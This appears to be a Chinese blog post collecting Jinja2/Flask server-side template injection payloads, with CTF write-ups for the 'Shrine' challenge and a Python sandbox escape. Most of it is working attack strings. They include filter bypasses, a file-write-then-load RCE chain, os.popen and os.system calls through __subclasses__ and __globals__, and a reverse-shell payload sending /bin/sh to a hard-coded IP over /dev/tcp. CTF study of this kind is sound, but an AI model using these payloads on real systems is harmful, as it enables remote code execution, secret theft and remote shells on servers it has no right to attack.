---
title: ssti
abbrlink: 28940
date: 2018-07-17 15:09:17
tags: python安全
---

## payload大全

####  bypass 各种字符串

1. 利用request.args

```
{{''[request.args.a][request.args.b][2][request.args.c]()[40]('/opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt')[request.args.d]()}}?a=__class__&b=__mro__&c=__subclasses__&d=read
```

2. 利用字符串拼接

```python
{{request['__cla'+'ss__']['__m'+'ro__'][9]['__subcla'+'sses__']()[230]('''/bin/sh -c 
'l'''+'''s '''+chr(62)+'''& /dev/tcp/123.207.90.143/2333 0'''+chr(62)+'''&1 ''',shell=True)}}
```

3. 利用各种编码

   > "MTIzCg==".decode("base64")

4. 利用attr

```python
{{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}&class=class&usc=_
```

```
{{request|attr(["_"*2,"class","_"*2]|join)}}
{{request|attr(["__","class","__"]|join)}}
{{request|attr("__class__")}}
{{request.__class__}}
```

#### bypass "[" 和 "]"

1. 利用 attr

```
{{request|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)}}&class=class&usc=_
```

2. 进阶版 利用.getlist

```
{{request|attr(request.args.getlist(request.args.l)|join)}}&l=a&a=_&a=_&a=class&a=_&a=_
```

#### bypassing "|join"

1. 利用format

```
{{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&f=%s%sclass%s%s&a=_
```

#### FinalRce:

第一步:

```
http://localhost:5000/?exploit={%set a,b,c,d,e,f,g,h,i = request.__class__.__mro__%}{{i.__subclasses__().pop(40)(request.args.file,request.args.write).write(request.args.payload)}}{{config.from_pyfile(request.args.file)}}&file=/tmp/foo.py&write=w&payload=print+1337
```

第二步:

```
http://localhost:5000/?exploit={%set a,b,c,d,e,f,g,h,i = request|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.mro,request.args.usc*2)|join)%}{{(i|attr((request.args.usc*2,request.args.subc,request.args.usc*2)|join)()).pop(40)(request.args.file,request.args.write).write(request.args.payload)}}{{config.from_pyfile(request.args.file)}}&class=class&mro=mro&subc=subclasses&usc=_&file=/tmp/foo.py&write=w&payload=print+1337
```

#### Accessing parameters

In most examples we used request.args to access GET parameters, but there are other dictionaries that can be populated with custom values:

* GET: request.args
* Cookies: request.cookies
* Headers: request.headers
* Environment: request.environ
* Values: request.values

The following notations can be used to access attributes of an object:

* request.__class__
* request["__class__"]
* request|attr("__class__")

Elements of arrays can be accessed with:

* array[0]
* array.pop(0)

#### import

```python
{% import module %} – Allows you to import python modules.

Example: {% import subprocess %}

That’s all we need to craft an exploit code.

{% import os %}{{ os.popen("whoami").read() }}
```

# Shrine

```python

import flask
import os


app = flask.Flask(__name__)
app.config['FLAG'] = os.environ.pop('FLAG')

@app.route('/')
def index():
    return open(__file__).read()

@app.route('/shrine/<path:shrine>')
def shrine(shrine):
    def safe_jinja(s):
        s = s.replace('(', '').replace(')', '')
        blacklist = ['config', 'self']
        return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist])+s
    return flask.render_template_string(safe_jinja(shrine))

if __name__ == '__main__':
    app.run(debug=True)
```

### 递归打印对象的所有字属性

```python
def search(obj, max_depth):
    visited_clss = []
    visited_objs = []
    
    def visit(obj, path='obj', depth=0):
        yield path, obj
        
        if depth == max_depth:
            return
        elif isinstance(obj, (int, float, bool, str, bytes)):
            return
        elif isinstance(obj, type):
            if obj in visited_clss:
                return
            visited_clss.append(obj)
            print(obj)
        else:
            if obj in visited_objs:
                return
            visited_objs.append(obj)
        
        # attributes
        # "__mro__", "__subclasses__()"
        for name in dir(obj):
            if name.startswith('__') and name.endswith('__'):
                if name not in  ('__globals__', '__class__', '__self__',
                                 '__weakref__', '__objclass__', '__module__'):
                    continue
            attr = getattr(obj, name)
            yield from visit(attr, '{}.{}'.format(path, name), depth + 1)
        
        # dict values
        if hasattr(obj, 'items') and callable(obj.items):
            try:
                for k, v in obj.items():
                    yield from visit(v, '{}[{}]'.format(path, repr(k)), depth)
            except:
                pass
        
        # items
        elif isinstance(obj, (set, list, tuple, frozenset)):
            for i, v in enumerate(obj):
                yield from visit(v, '{}[{}]'.format(path, repr(i)), depth)
            
    yield from visit(obj)
```

### 寻找config

```python
for path, obj in search(flask.request, 10):
	if str(obj) == app.config['FLAG']:
	return path
```

`obj.application.__self__._load_form_data.__globals__['json'].JSONEncoder.default.__globals__['current_app'].config['FLAG']`

除了`request`对象之外，其他全局变量类似于`g`, `session`通过更多或更少层次的遍历，也是可以找到flag。

flask全局参数（变量+方法）: `config`, `request`,`g`,`session`,`self`, `url_for`。

### payload

```python
http://shrine.chal.ctf.westerns.tokyo/shrine/%7B%7Brequest.application.__self__._load_form_data.__globals__['json'].JSONEncoder.default.__globals__['current_app'].config['FLAG']%7D%7D
```

```
url_for.__globals__['current_app'].config.FLAG
url_for.__globals__.__getitem__('os').listdir('./')
url_for.__globals__.__getitem__('__builtins__').__getitem__('open')('flag_secret_file_910230912900891283').read()
```

# pythonforfun2

```
def fun(a, b=print(exec("import os"),eval("os.listdir('.')")))
结果=> 
Illegal use! (exec)
```

存在沙箱，需要绕过。

```
NOT_ALLOWED = ['SystemExit', '__build_class__', '__import__', '__loader__', '__spec__', 'abs', 'ascii', 'bin',
               'bytearray', 'bytes', 'chr', 'compile', 'eval', 'exec', 'exit', 'format', 'frozenset', 'hex', 'input',
               'isinstance', 'issubclass', 'locals', 'map', 'memoryview', 'next', 'object', 'oct', 'ord', 'quit',
               'range', 'reversed', 'set', 'str', 'type', 'vars', '\\', '\'', ';', '[', ']', 'if', 'else', 'import',
               'const', 'join', 'replace', 'translate', 'try', 'except', 'with', 'content', 'frame', 'back', 'open',
               'os', 'sys', 'lower', 'subclass', 'globals', '__name__', '__doc__', '__package__', '__loader__',
               '__spec__', '__build_class__', '__import__', 'abs', 'all', 'any', 'ascii', 'bin', 'breakpoint',
               'callable', 'chr', 'compile', 'delattr', 'dir', 'divmod', 'eval', 'exec', 'format', 'getattr', 'globals',
               'hasattr', 'hash', 'hex', 'id', 'input', 'isinstance', 'issubclass', 'iter', 'len', 'locals', 'max',
               'min', 'next', 'oct', 'ord', 'pow', 'print', 'repr', 'round', 'setattr', 'sorted', 'sum', 'vars', 'None',
               'Ellipsis', 'NotImplemented', 'False', 'True', 'bool', 'memoryview', 'bytearray', 'bytes', 'classmethod',
               'complex', 'dict', 'enumerate', 'filter', 'float', 'frozenset', 'property', 'int', 'list', 'map',
               'object', 'range', 'reversed', 'set', 'slice', 'staticmethod', 'str', 'super', 'tuple', 'type', 'zip',
               '__debug__', 'BaseException', 'Exception', 'TypeError', 'StopAsyncIteration', 'StopIteration',
               'GeneratorExit', 'SystemExit', 'KeyboardInterrupt', 'ImportError', 'ModuleNotFoundError', 'OSError',
               'EnvironmentError', 'IOError', 'EOFError', 'RuntimeError', 'RecursionError', 'NotImplementedError',
               'NameError', 'UnboundLocalError', 'AttributeError', 'SyntaxError', 'IndentationError', 'TabError',
               'LookupError', 'IndexError', 'KeyError', 'ValueError', 'UnicodeError', 'UnicodeEncodeError',
               'UnicodeDecodeError', 'UnicodeTranslateError', 'AssertionError', 'ArithmeticError', 'FloatingPointError',
               'OverflowError', 'ZeroDivisionError', 'SystemError', 'ReferenceError', 'MemoryError', 'BufferError',
               'Warning', 'UserWarning', 'DeprecationWarning', 'PendingDeprecationWarning', 'SyntaxWarning',
               'RuntimeWarning', 'FutureWarning', 'ImportWarning', 'UnicodeWarning', 'BytesWarning', 'ResourceWarning',
               'ConnectionError', 'BlockingIOError', 'BrokenPipeError', 'ChildProcessError', 'ConnectionAbortedError',
               'ConnectionRefusedError', 'ConnectionResetError', 'FileExistsError', 'FileNotFoundError',
               'IsADirectoryError', 'NotAdirectoryError', 'InterruptedError', 'PermissionError', 'ProcessLookupError', '
               'TimeoutError', 'open', 'quit', 'exit', 'copyright', 'credits', 'license', 'help']
​````
```

可以通过查找`sys`模块来实现。

首先通过`''.__class__.__base__`或者`''.__class__.__mro__`获得`Object`类。

注意:

```
__base__列出其基类, __mro__给出了method resolution order，即解析方法调用的顺序。
```

然后获取`Object`所有子类。

由于`codecs.StreamReaderWriter` 或者`_NamespaceLoader`可以调用`sys`模块，首先找到`StreamReaderWriter`的下标。

```shell
>>> ''.__class__.__mro__
(<class 'str'>, <class 'object'>)
>>> ''.__class__.__mro__[1]
<class 'object'>
>>> for i,val in enumerate(''.__class__.__mro__[1].__subclasses__()):
...     if "Stream" in str(val):
...             print(i, "  ", val)
...
115    <class 'codecs.StreamReaderWriter'>
204    <class 'tarfile._StreamProxy'>
233    <class 'tarfile._Stream'>
248    <class 'contextlib._RedirectStream'>
279    <class 'codecs.StreamRecoder'>
>>> dir(''.__class__.__mro__[1].__subclasses__()[64].__init__)
['__annotations__', '__call__', '__class__', '__closure__', '__code__', '__defaults__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__get__', '__getattribute__', '__globals__', '__gt__', '__hash__', '__init__', '__kwdefaults__', '__le__', '__lt__', '__module__', '__name__', '__ne__', '__new__', '__qualname__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__']
>>> for i,val in enumerate(''.__class__.__mro__[1].__subclasses__()):
...     if "_NamespaceLoader" in str(val):
...             print(i, val)
...
41 <class '_frozen_importlib_external._NamespaceLoader'>
>>> ''.__class__.__mro__[1].__subclasses__()[41].__init__.__globals__["sys"].modules["os"].system('ls')
awd  bin  flag.txt  pwndbg  temp
```

获取对象属性值:

```shell
>>> ''.__class__.__mro__[1].__subclasses__()[115].__init__.__globals__ 
或者:
>>> for i, val in enumerate(getattr(''.__class__.__mro__[1].__subclasses__()[64].__init__, "__globals__")):
...     print(i, val)
...
0 utf_16_le_encode
1 getencoder
2 __name__
3 utf_32_be_encode
4 utf_7_decode
5 __builtins__
6 open
7 utf_32_encode
8 BOM_UTF16_BE
9 BOM32_BE
10 replace_errors
11 sys
................
>>> ''.__class__.__mro__[1].__subclasses__()[115].__init__.__globals__["sys"].modules["os"]
<module 'os' from '/usr/lib/python3.5/os.py'>
>>> ''.__class__.__mro__[1].__subclasses__()[115].__init__.__globals__["sys"].modules["os"].system('ls')
awd  bin  flag.txt  pwndbg  temp
```

payload:

```
def fun(a, b=''.__class__.__mro__[1].__subclasses__()[115].__init__.__globals__["sys"].modules["os"].system('cat Flag'))
or:
def fun(a,b,c=print([].__class__.__base__.__subclasses__()[127].__init__.__globals__['system']('ls'))):
or:
def fun(a=print(().__class__.__bases__[0].__subclasses__()[93].__init__.__globals__["sys"].modules["os"].system("ls")), b=1)
```